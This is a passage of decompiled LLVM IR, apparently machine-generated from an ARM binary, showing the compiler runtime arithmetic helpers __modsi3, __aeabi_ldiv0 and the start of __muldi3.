.thread67:                                        ; preds = %bb75, %.thread65
  %v1_13cc0 = phi i32 [ %v1_13cb4, %bb75 ], [ 0, %.thread65 ]
  %v3_13cc0 = and i32 %v1_13cc0, %v1_13cac
  br label %bb76

dec_label_pc_13ccc.preheader:                     ; preds = %bb75
  %v2_13ccc99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_13ccc99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_13d5c, %bb74, %bb89, %bb84, %dec_label_pc_13d2c, %.thread67
  %v5_13cc4 = phi i32 [ %v1_13cb4, %bb74 ], [ %v3_13cc0, %.thread67 ], [ %v1_13d08.v6_13d08.v6_13d10.v6_13d18, %dec_label_pc_13d2c ], [ 0, %bb84 ], [ %v1_13d60, %dec_label_pc_13d5c ], [ %v2_13d5c, %bb89 ]
  ret i32 %v5_13cc4

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_13ccc.preheader
  %v0_13ce0.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_13ccc.preheader ], [ %v4_13cd4, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13ccc.preheader ], [ %v2_13cd811, %.thread1.thread9 ]
  br label %dec_label_pc_13ce0thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_13ccc.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_13cd811, %.thread1.thread9 ], [ 0, %dec_label_pc_13ccc.preheader ]
  %v0_13ce0.pr33100 = phi i32 [ %v4_13cd4, %.thread1.thread9 ], [ %arg2, %dec_label_pc_13ccc.preheader ]
  %v4_13cd0 = icmp ult i32 %v0_13ce0.pr33100, %v1_13cb4
  br i1 %v4_13cd0, label %bb78, label %dec_label_pc_13ce0thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_13cd4 = and i32 %v0_13ce0.pr33100, 268435456
  %v3_13cd4 = icmp eq i32 %v2_13cd4, 0
  %v4_13cd4 = mul i32 %v0_13ce0.pr33100, 16
  br i1 %v3_13cd4, label %.thread1.thread9, label %dec_label_pc_13ce0.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_13cd811 = add i32 %storemerge101, 4
  %v2_13ccc = icmp ugt i32 %v4_13cd4, 268435455
  br i1 %v2_13ccc, label %.thread, label %bb77

dec_label_pc_13ce0thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_13ce0thread-pre-split.loopexit

dec_label_pc_13ce0thread-pre-split.loopexit:      ; preds = %dec_label_pc_13ce0thread-pre-split.loopexit.loopexit, %.thread
  %v0_13ce0.pr3398 = phi i32 [ %v0_13ce0.pr33.lcssa, %.thread ], [ %v0_13ce0.pr33100, %dec_label_pc_13ce0thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_13ce0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13ce0thread-pre-split

dec_label_pc_13ce0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13ce0thread-pre-split.loopexit
  %v1_13cec39 = phi i32 [ %storemerge95, %dec_label_pc_13ce0thread-pre-split.loopexit ], [ %v2_13cec, %.thread4 ]
  %v0_13ce0.pr = phi i32 [ %v0_13ce0.pr3398, %dec_label_pc_13ce0thread-pre-split.loopexit ], [ %v3_13ce8, %.thread4 ]
  br label %dec_label_pc_13ce0

dec_label_pc_13ce0.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13ce0.loopexit, %dec_label_pc_13ce0thread-pre-split
  %v0_13cf4.pr = phi i32 [ %v1_13cec39, %dec_label_pc_13ce0thread-pre-split ], [ %storemerge101, %dec_label_pc_13ce0.loopexit ]
  %v1_13ce8 = phi i32 [ %v0_13ce0.pr, %dec_label_pc_13ce0thread-pre-split ], [ %v4_13cd4, %dec_label_pc_13ce0.loopexit ]
  %v2_13ce0 = icmp slt i32 %v1_13ce8, 0
  br i1 %v2_13ce0, label %dec_label_pc_13cf4, label %bb79

bb79:                                             ; preds = %dec_label_pc_13ce0
  %v4_13ce4 = icmp ult i32 %v1_13ce8, %v1_13cb4
  br i1 %v4_13ce4, label %.thread4, label %dec_label_pc_13cf4

.thread4:                                         ; preds = %bb79
  %v3_13ce8 = mul i32 %v1_13ce8, 2
  %v2_13cec = add i32 %v0_13cf4.pr, 1
  br label %dec_label_pc_13ce0thread-pre-split

dec_label_pc_13cf4:                               ; preds = %bb79, %dec_label_pc_13ce0
  %v2_13cf4 = add i32 %v0_13cf4.pr, -3
  %v5_13cf8 = icmp slt i32 %v0_13cf4.pr, 3
  br i1 %v5_13cf8, label %dec_label_pc_13d38, label %dec_label_pc_13cfc

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cf4, %bb83
  %v6_13d24 = phi i32 [ %v0_13d2c, %bb83 ], [ %v2_13cf4, %dec_label_pc_13cf4 ]
  %v1_13d00 = phi i32 [ %v1_13d08.v6_13d08.v6_13d10.v6_13d18, %bb83 ], [ %v1_13cb4, %dec_label_pc_13cf4 ]
  %v3_13d2012 = phi i32 [ %v3_13d20, %bb83 ], [ %v1_13ce8, %dec_label_pc_13cf4 ]
  %v3_13cfc = icmp ult i32 %v1_13d00, %v3_13d2012
  %v3_13d00 = select i1 %v3_13cfc, i32 0, i32 %v3_13d2012
  %v1_13d08 = sub i32 %v1_13d00, %v3_13d00
  %v4_13d04 = udiv i32 %v3_13d2012, 2
  %v6_13d04 = icmp ult i32 %v1_13d08, %v4_13d04
  %v6_13d08 = select i1 %v6_13d04, i32 0, i32 %v4_13d04
  %v1_13d08.v6_13d08 = sub i32 %v1_13d08, %v6_13d08
  %.demorgan = and i1 %v3_13cfc, %v6_13d04
  %v4_13d0c = udiv i32 %v3_13d2012, 4
  %v6_13d0c = icmp ult i32 %v1_13d08.v6_13d08, %v4_13d0c
  %v6_13d10 = select i1 %v6_13d0c, i32 0, i32 %v4_13d0c
  %v1_13d08.v6_13d08.v6_13d10 = sub i32 %v1_13d08.v6_13d08, %v6_13d10
  %.demorgan71 = and i1 %.demorgan, %v6_13d0c
  %v4_13d14 = udiv i32 %v3_13d2012, 8
  %v6_13d14 = icmp ult i32 %v1_13d08.v6_13d08.v6_13d10, %v4_13d14
  %v6_13d18 = select i1 %v6_13d14, i32 0, i32 %v4_13d14
  %v1_13d08.v6_13d08.v6_13d10.v6_13d18 = sub i32 %v1_13d08.v6_13d08.v6_13d10, %v6_13d18
  %.demorgan72 = and i1 %.demorgan71, %v6_13d14
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_13cfc
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_13cfc, %bb80
  %v2_13d1c = add i32 %v1_13d08.v6_13d08.v6_13d10.v6_13d18, -1
  %v4_13d1c = sub i32 0, %v1_13d08.v6_13d08.v6_13d10.v6_13d18
  %v5_13d1c = and i32 %v1_13d08.v6_13d08.v6_13d10.v6_13d18, %v4_13d1c
  %v3_13d20 = udiv i32 %v3_13d2012, 16
  %v5_13d24 = icmp slt i32 %v1_13d08.v6_13d08.v6_13d10.v6_13d18, 1
  br i1 %v5_13d24, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_13d24 = add i32 %v6_13d24, -4
  %v9_13d24 = sub i32 3, %v6_13d24
  %v10_13d24 = and i32 %v9_13d24, %v6_13d24
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_13d2c = phi i32 [ %v6_13d24, %bb81 ], [ %v7_13d24, %bb82 ]
  %v0_13d2815.in = phi i32 [ %v2_13d1c, %bb81 ], [ %v7_13d24, %bb82 ]
  %v1_13d2814.in = phi i32 [ %v5_13d1c, %bb81 ], [ %v10_13d24, %bb82 ]
  %v1_13d2814 = icmp slt i32 %v1_13d2814.in, 0
  %v0_13d2815 = icmp slt i32 %v0_13d2815.in, 0
  %v2_13d28 = xor i1 %v0_13d2815, %v1_13d2814
  br i1 %v2_13d28, label %dec_label_pc_13d2c, label %dec_label_pc_13cfc

dec_label_pc_13d2c:                               ; preds = %bb83
  %v1_13d2c = urem i32 %v0_13d2c, 4
  %v2_13d2c = icmp eq i32 %v1_13d2c, 0
  br i1 %v2_13d2c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_13d2c
  %v3_13d30 = icmp eq i32 %v1_13d08.v6_13d08.v6_13d10.v6_13d18, 0
  br i1 %v3_13d30, label %bb76, label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %bb84, %dec_label_pc_13cf4
  %v0_13d4c = phi i32 [ %v3_13d20, %bb84 ], [ %v1_13ce8, %dec_label_pc_13cf4 ]
  %v1_13d48 = phi i32 [ %v1_13d08.v6_13d08.v6_13d10.v6_13d18, %bb84 ], [ %v1_13cb4, %dec_label_pc_13cf4 ]
  %v0_13d38 = phi i32 [ %v0_13d2c, %bb84 ], [ %v2_13cf4, %dec_label_pc_13cf4 ]
  %v5_13d3c = icmp slt i32 %v0_13d38, -2
  br i1 %v5_13d3c, label %dec_label_pc_13d5c, label %dec_label_pc_13d40

dec_label_pc_13d40:                               ; preds = %dec_label_pc_13d38
  %v8_13d38 = icmp eq i32 %v0_13d38, -2
  br i1 %v8_13d38, label %dec_label_pc_13d50, label %dec_label_pc_13d44

dec_label_pc_13d44:                               ; preds = %dec_label_pc_13d40
  %v3_13d44 = icmp ult i32 %v1_13d48, %v0_13d4c
  br i1 %v3_13d44, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_13d44
  %v2_13d44 = sub i32 %v1_13d48, %v0_13d4c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_13d44, %bb85
  %v0_13d5052 = phi i32 [ %v1_13d48, %dec_label_pc_13d44 ], [ %v2_13d44, %bb85 ]
  %v3_13d4c = udiv i32 %v0_13d4c, 2
  br label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d40, %bb86
  %v0_13d58 = phi i32 [ %v0_13d4c, %dec_label_pc_13d40 ], [ %v3_13d4c, %bb86 ]
  %v1_13d54 = phi i32 [ %v1_13d48, %dec_label_pc_13d40 ], [ %v0_13d5052, %bb86 ]
  %v3_13d50 = icmp ult i32 %v1_13d54, %v0_13d58
  br i1 %v3_13d50, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_13d50
  %v2_13d50 = sub i32 %v1_13d54, %v0_13d58
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_13d50, %bb87
  %v0_13d5c55 = phi i32 [ %v1_13d54, %dec_label_pc_13d50 ], [ %v2_13d50, %bb87 ]
  %v3_13d58 = udiv i32 %v0_13d58, 2
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d38, %bb88
  %v2_13d60 = phi i32 [ %v0_13d4c, %dec_label_pc_13d38 ], [ %v3_13d58, %bb88 ]
  %v1_13d60 = phi i32 [ %v1_13d48, %dec_label_pc_13d38 ], [ %v0_13d5c55, %bb88 ]
  %v3_13d5c = icmp ult i32 %v1_13d60, %v2_13d60
  br i1 %v3_13d5c, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_13d5c
  %v2_13d5c = sub i32 %v1_13d60, %v2_13d60
  br label %bb76

dec_label_pc_13d68:                               ; preds = %entry
  %v0_13d68 = load i32, i32* @lr, align 4
  %v0_13d6c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13d68)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13d60, { 1, 2, 0 }
  uselistorder i32 %v0_13d4c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13d2c, { 1, 0, 2 }
  uselistorder i32 %v7_13d24, { 1, 0 }
  uselistorder i32 %v3_13d20, { 1, 0 }
  uselistorder i32 %v1_13d08.v6_13d08.v6_13d10.v6_13d18, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_13d14, { 1, 0 }
  uselistorder i32 %v4_13d0c, { 1, 0 }
  uselistorder i32 %v4_13d04, { 1, 0 }
  uselistorder i32 %v6_13d24, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13cf4, { 1, 0 }
  uselistorder i32 %v1_13ce8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_13cd4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13ce0.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13cb4, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_13d5c, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_13d50, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_13d78 = icmp eq i32 %arg2, 0
  br i1 %v2_13d78, label %dec_label_pc_13e4c, label %dec_label_pc_13d80

dec_label_pc_13d80:                               ; preds = %entry
  %v1_13d78 = icmp slt i32 %arg2, 0
  br i1 %v1_13d78, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_13d80
  %v2_13d80 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13d80, %bb
  %v4_13d98 = phi i32 [ %arg2, %dec_label_pc_13d80 ], [ %v2_13d80, %bb ]
  %v0_13d84 = load i32, i32* @r0, align 4
  %v1_13d84 = icmp slt i32 %v0_13d84, 0
  br i1 %v1_13d84, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_13d88 = sub i32 0, %v0_13d84
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_13d90 = phi i32 [ %v0_13d84, %bb79 ], [ %v2_13d88, %bb80 ]
  %v1_13d8c = add i32 %v4_13d98, -1
  %v7_13d8c = icmp eq i32 %v4_13d98, 1
  br i1 %v7_13d8c, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_13d90 = icmp eq i32 %v1_13d90, %v4_13d98
  br i1 %v10_13d90, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_13d90 = icmp ult i32 %v1_13d90, %v4_13d98
  br i1 %v4_13d90, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_13d98 = and i32 %v1_13d8c, %v4_13d98
  %v8_13d98 = icmp eq i32 %v6_13d98, 0
  br i1 %v8_13d98, label %.thread72, label %dec_label_pc_13da8.preheader

dec_label_pc_13da8.preheader:                     ; preds = %bb84
  %v2_13da8109 = icmp ugt i32 %v4_13d98, 268435455
  br i1 %v2_13da8109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_13d9c64 = phi i32 [ %v1_13d90, %bb84 ], [ 0, %.thread70 ]
  %v3_13d9c = and i32 %v1_13d9c64, %v1_13d8c
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_13da8.preheader
  %v0_13dbc.pr35.lcssa = phi i32 [ %v4_13d98, %dec_label_pc_13da8.preheader ], [ %v4_13db0, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13da8.preheader ], [ %v2_13db49, %.thread2.thread7 ]
  br label %dec_label_pc_13dbcthread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_13da8.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_13db49, %.thread2.thread7 ], [ 0, %dec_label_pc_13da8.preheader ]
  %v0_13dbc.pr35110 = phi i32 [ %v4_13db0, %.thread2.thread7 ], [ %v4_13d98, %dec_label_pc_13da8.preheader ]
  %v4_13dac = icmp ult i32 %v0_13dbc.pr35110, %v1_13d90
  br i1 %v4_13dac, label %bb86, label %dec_label_pc_13dbcthread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_13db0 = and i32 %v0_13dbc.pr35110, 268435456
  %v3_13db0 = icmp eq i32 %v2_13db0, 0
  %v4_13db0 = mul i32 %v0_13dbc.pr35110, 16
  br i1 %v3_13db0, label %.thread2.thread7, label %dec_label_pc_13dbc.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_13db49 = add i32 %storemerge111, 4
  %v2_13da8 = icmp ugt i32 %v4_13db0, 268435455
  br i1 %v2_13da8, label %.thread1, label %bb85

dec_label_pc_13dbcthread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_13dbcthread-pre-split.loopexit

dec_label_pc_13dbcthread-pre-split.loopexit:      ; preds = %dec_label_pc_13dbcthread-pre-split.loopexit.loopexit, %.thread1
  %v0_13dbc.pr35108 = phi i32 [ %v0_13dbc.pr35.lcssa, %.thread1 ], [ %v0_13dbc.pr35110, %dec_label_pc_13dbcthread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_13dbcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13dbcthread-pre-split

dec_label_pc_13dbcthread-pre-split:               ; preds = %.thread4, %dec_label_pc_13dbcthread-pre-split.loopexit
  %v1_13dc841 = phi i32 [ %storemerge105, %dec_label_pc_13dbcthread-pre-split.loopexit ], [ %v2_13dc8, %.thread4 ]
  %v2_13dc036 = phi i32 [ %v1_13d90, %dec_label_pc_13dbcthread-pre-split.loopexit ], [ %v2_13dc0, %.thread4 ]
  %v0_13dbc.pr = phi i32 [ %v0_13dbc.pr35108, %dec_label_pc_13dbcthread-pre-split.loopexit ], [ %v3_13dc4, %.thread4 ]
  br label %dec_label_pc_13dbc

dec_label_pc_13dbc.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_13dbc

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13dbc.loopexit, %dec_label_pc_13dbcthread-pre-split
  %v0_13dd0.pr = phi i32 [ %v1_13dc841, %dec_label_pc_13dbcthread-pre-split ], [ %storemerge111, %dec_label_pc_13dbc.loopexit ]
  %v2_13dc0 = phi i32 [ %v2_13dc036, %dec_label_pc_13dbcthread-pre-split ], [ %v1_13d90, %dec_label_pc_13dbc.loopexit ]
  %v1_13dc4 = phi i32 [ %v0_13dbc.pr, %dec_label_pc_13dbcthread-pre-split ], [ %v4_13db0, %dec_label_pc_13dbc.loopexit ]
  %v2_13dbc = icmp slt i32 %v1_13dc4, 0
  br i1 %v2_13dbc, label %dec_label_pc_13dd0, label %bb87

bb87:                                             ; preds = %dec_label_pc_13dbc
  %v4_13dc0 = icmp ult i32 %v1_13dc4, %v2_13dc0
  br i1 %v4_13dc0, label %.thread4, label %dec_label_pc_13dd0

.thread4:                                         ; preds = %bb87
  %v3_13dc4 = mul i32 %v1_13dc4, 2
  %v2_13dc8 = add i32 %v0_13dd0.pr, 1
  br label %dec_label_pc_13dbcthread-pre-split

dec_label_pc_13dd0:                               ; preds = %bb87, %dec_label_pc_13dbc
  %v2_13dd0 = add i32 %v0_13dd0.pr, -3
  %v5_13dd4 = icmp slt i32 %v0_13dd0.pr, 3
  br i1 %v5_13dd4, label %dec_label_pc_13e14, label %dec_label_pc_13dd8

dec_label_pc_13dd8:                               ; preds = %dec_label_pc_13dd0, %bb91
  %v6_13e00 = phi i32 [ %v0_13e08, %bb91 ], [ %v2_13dd0, %dec_label_pc_13dd0 ]
  %v1_13ddc = phi i32 [ %v1_13de4.v6_13de4.v6_13dec.v6_13df4, %bb91 ], [ %v2_13dc0, %dec_label_pc_13dd0 ]
  %v3_13dfc10 = phi i32 [ %v3_13dfc, %bb91 ], [ %v1_13dc4, %dec_label_pc_13dd0 ]
  %v3_13dd8 = icmp ult i32 %v1_13ddc, %v3_13dfc10
  %v3_13ddc = select i1 %v3_13dd8, i32 0, i32 %v3_13dfc10
  %v1_13de4 = sub i32 %v1_13ddc, %v3_13ddc
  %v4_13de0 = udiv i32 %v3_13dfc10, 2
  %v6_13de0 = icmp ult i32 %v1_13de4, %v4_13de0
  %v6_13de4 = select i1 %v6_13de0, i32 0, i32 %v4_13de0
  %v1_13de4.v6_13de4 = sub i32 %v1_13de4, %v6_13de4
  %.demorgan = and i1 %v3_13dd8, %v6_13de0
  %v4_13de8 = udiv i32 %v3_13dfc10, 4
  %v6_13de8 = icmp ult i32 %v1_13de4.v6_13de4, %v4_13de8
  %v6_13dec = select i1 %v6_13de8, i32 0, i32 %v4_13de8
  %v1_13de4.v6_13de4.v6_13dec = sub i32 %v1_13de4.v6_13de4, %v6_13dec
  %.demorgan76 = and i1 %.demorgan, %v6_13de8
  %v4_13df0 = udiv i32 %v3_13dfc10, 8
  %v6_13df0 = icmp ult i32 %v1_13de4.v6_13de4.v6_13dec, %v4_13df0
  %v6_13df4 = select i1 %v6_13df0, i32 0, i32 %v4_13df0
  %v1_13de4.v6_13de4.v6_13dec.v6_13df4 = sub i32 %v1_13de4.v6_13de4.v6_13dec, %v6_13df4
  %.demorgan77 = and i1 %.demorgan76, %v6_13df0
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_13dd8
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_13dd8, %bb88
  %v2_13df8 = add i32 %v1_13de4.v6_13de4.v6_13dec.v6_13df4, -1
  %v4_13df8 = sub i32 0, %v1_13de4.v6_13de4.v6_13dec.v6_13df4
  %v5_13df8 = and i32 %v1_13de4.v6_13de4.v6_13dec.v6_13df4, %v4_13df8
  %v3_13dfc = udiv i32 %v3_13dfc10, 16
  %v5_13e00 = icmp slt i32 %v1_13de4.v6_13de4.v6_13dec.v6_13df4, 1
  br i1 %v5_13e00, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_13e00 = add i32 %v6_13e00, -4
  %v9_13e00 = sub i32 3, %v6_13e00
  %v10_13e00 = and i32 %v9_13e00, %v6_13e00
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_13e08 = phi i32 [ %v6_13e00, %bb89 ], [ %v7_13e00, %bb90 ]
  %v0_13e0413.in = phi i32 [ %v2_13df8, %bb89 ], [ %v7_13e00, %bb90 ]
  %v1_13e0412.in = phi i32 [ %v5_13df8, %bb89 ], [ %v10_13e00, %bb90 ]
  %v1_13e0412 = icmp slt i32 %v1_13e0412.in, 0
  %v0_13e0413 = icmp slt i32 %v0_13e0413.in, 0
  %v2_13e04 = xor i1 %v0_13e0413, %v1_13e0412
  br i1 %v2_13e04, label %dec_label_pc_13e08, label %dec_label_pc_13dd8

dec_label_pc_13e08:                               ; preds = %bb91
  %v1_13e08 = urem i32 %v0_13e08, 4
  %v2_13e08 = icmp eq i32 %v1_13e08, 0
  br i1 %v2_13e08, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_13e08
  %v3_13e0c = icmp eq i32 %v1_13de4.v6_13de4.v6_13dec.v6_13df4, 0
  br i1 %v3_13e0c, label %.thread6, label %dec_label_pc_13e14

dec_label_pc_13e14:                               ; preds = %bb92, %dec_label_pc_13dd0
  %v0_13e28 = phi i32 [ %v3_13dfc, %bb92 ], [ %v1_13dc4, %dec_label_pc_13dd0 ]
  %v1_13e24 = phi i32 [ %v1_13de4.v6_13de4.v6_13dec.v6_13df4, %bb92 ], [ %v2_13dc0, %dec_label_pc_13dd0 ]
  %v0_13e14 = phi i32 [ %v0_13e08, %bb92 ], [ %v2_13dd0, %dec_label_pc_13dd0 ]
  %v5_13e18 = icmp slt i32 %v0_13e14, -2
  br i1 %v5_13e18, label %dec_label_pc_13e38, label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e14
  %v8_13e14 = icmp eq i32 %v0_13e14, -2
  br i1 %v8_13e14, label %dec_label_pc_13e2c, label %dec_label_pc_13e20

dec_label_pc_13e20:                               ; preds = %dec_label_pc_13e1c
  %v3_13e20 = icmp ult i32 %v1_13e24, %v0_13e28
  br i1 %v3_13e20, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_13e20
  %v2_13e20 = sub i32 %v1_13e24, %v0_13e28
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_13e20, %bb93
  %v0_13e2c54 = phi i32 [ %v1_13e24, %dec_label_pc_13e20 ], [ %v2_13e20, %bb93 ]
  %v3_13e28 = udiv i32 %v0_13e28, 2
  br label %dec_label_pc_13e2c

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e1c, %bb94
  %v0_13e34 = phi i32 [ %v0_13e28, %dec_label_pc_13e1c ], [ %v3_13e28, %bb94 ]
  %v1_13e30 = phi i32 [ %v1_13e24, %dec_label_pc_13e1c ], [ %v0_13e2c54, %bb94 ]
  %v3_13e2c = icmp ult i32 %v1_13e30, %v0_13e34
  br i1 %v3_13e2c, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_13e2c
  %v2_13e2c = sub i32 %v1_13e30, %v0_13e34
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_13e2c, %bb95
  %v0_13e3857 = phi i32 [ %v1_13e30, %dec_label_pc_13e2c ], [ %v2_13e2c, %bb95 ]
  %v3_13e34 = udiv i32 %v0_13e34, 2
  br label %dec_label_pc_13e38

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13e14, %bb96
  %v2_13e3c = phi i32 [ %v0_13e28, %dec_label_pc_13e14 ], [ %v3_13e34, %bb96 ]
  %v1_13e3c = phi i32 [ %v1_13e24, %dec_label_pc_13e14 ], [ %v0_13e3857, %bb96 ]
  %v3_13e38 = icmp ult i32 %v1_13e3c, %v2_13e3c
  br i1 %v3_13e38, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_13e38
  %v2_13e38 = sub i32 %v1_13e3c, %v2_13e3c
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13e38, %bb83, %.thread72, %dec_label_pc_13e08, %bb92, %bb97
  %v1_13e44 = phi i32 [ %v1_13de4.v6_13de4.v6_13dec.v6_13df4, %dec_label_pc_13e08 ], [ 0, %bb92 ], [ %v1_13e3c, %dec_label_pc_13e38 ], [ %v2_13e38, %bb97 ], [ %v3_13d9c, %.thread72 ], [ %v1_13d90, %bb83 ]
  br i1 %v1_13d84, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_13e44 = sub i32 0, %v1_13e44
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_13e48 = phi i32 [ %v1_13e44, %.thread6 ], [ %v2_13e44, %bb98 ]
  ret i32 %v1_13e48

dec_label_pc_13e4c:                               ; preds = %entry
  %v0_13e4c = load i32, i32* @lr, align 4
  %v0_13e50 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13e4c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_13e28, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13e08, { 1, 0, 2 }
  uselistorder i32 %v7_13e00, { 1, 0 }
  uselistorder i32 %v3_13dfc, { 1, 0 }
  uselistorder i32 %v1_13de4.v6_13de4.v6_13dec.v6_13df4, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_13df0, { 1, 0 }
  uselistorder i32 %v4_13de8, { 1, 0 }
  uselistorder i32 %v4_13de0, { 1, 0 }
  uselistorder i32 %v6_13e00, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13dd0, { 1, 0 }
  uselistorder i32 %v1_13dc4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_13dc0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_13db0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13dbc.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13d90, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_13d98, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_13e38, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13e2c, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_13dd8, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_13e5c = load i32, i32* @r0, align 4
  ret i32 %v1_13e5c
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_13e6c = udiv i32 %arg1, 65536
  %v3_13e70 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_13e6c, -65536
  %v5_13e74 = add i32 %tmp, -1
  %v6_13e74 = and i32 %v5_13e74, %arg1
  %tmp8 = mul i32 %v3_13e70, -65536
  %v5_13e78 = add i32 %tmp8, -1
  %v6_13e78 = and i32 %v5_13e78, %arg3
  %v2_13e7c = mul i32 %v6_13e78, %v6_13e74
  %v2_13e80 = mul i32 %v6_13e78, %v3_13e6c
  %v2_13e84 = mul i32 %v6_13e74, %v3_13e70
